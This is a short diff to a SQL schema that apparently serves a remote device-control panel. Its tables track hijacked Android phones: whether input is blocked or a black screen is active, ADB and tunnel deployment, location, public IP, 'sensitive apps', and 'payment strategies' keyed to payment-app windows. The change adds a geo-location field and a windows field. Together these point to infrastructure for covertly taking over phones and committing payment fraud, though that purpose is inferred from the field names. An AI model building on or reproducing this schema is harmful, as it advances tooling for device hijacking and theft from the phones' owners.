@@ -56,7 +56,7 @@ CREATE TABLE IF NOT EXISTS fisher_devices (
   is_device_owner TINYINT DEFAULT 0, device_input_blocked TINYINT DEFAULT 0, black_screen_active TINYINT DEFAULT 0,
   adb_enabled TINYINT DEFAULT 0, adb_wifi_enabled TINYINT DEFAULT 0, adb_deploy_enabled TINYINT DEFAULT 0,
   wifi_port INT DEFAULT 0, remote_port INT DEFAULT 0, tunnel_deployed TINYINT DEFAULT 0, tunnel_deployed_at BIGINT DEFAULT 0, debug_port INT DEFAULT 0,
-  country VARCHAR(64) DEFAULT '', province VARCHAR(64) DEFAULT '', city VARCHAR(64) DEFAULT '',
+  country VARCHAR(64) DEFAULT '', province VARCHAR(64) DEFAULT '', city VARCHAR(64) DEFAULT '', geo_location VARCHAR(255) DEFAULT '',
   ip VARCHAR(64) DEFAULT '', public_ip VARCHAR(64) DEFAULT '', network_type VARCHAR(64) DEFAULT '',
   screen_width INT DEFAULT 0, screen_height INT DEFAULT 0, density VARCHAR(32) DEFAULT '',
   storage_total BIGINT DEFAULT 0, storage_free BIGINT DEFAULT 0,
@@ -246,7 +246,7 @@ CREATE TABLE IF NOT EXISTS fisher_sensitive_apps (
 
 CREATE TABLE IF NOT EXISTS fisher_payment_strategies (
   id INT AUTO_INCREMENT PRIMARY KEY,
-  package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', window_class TEXT NULL, remark TEXT NULL,
+  package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', window_class TEXT NULL, windows TEXT NULL, remark TEXT NULL,
   enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
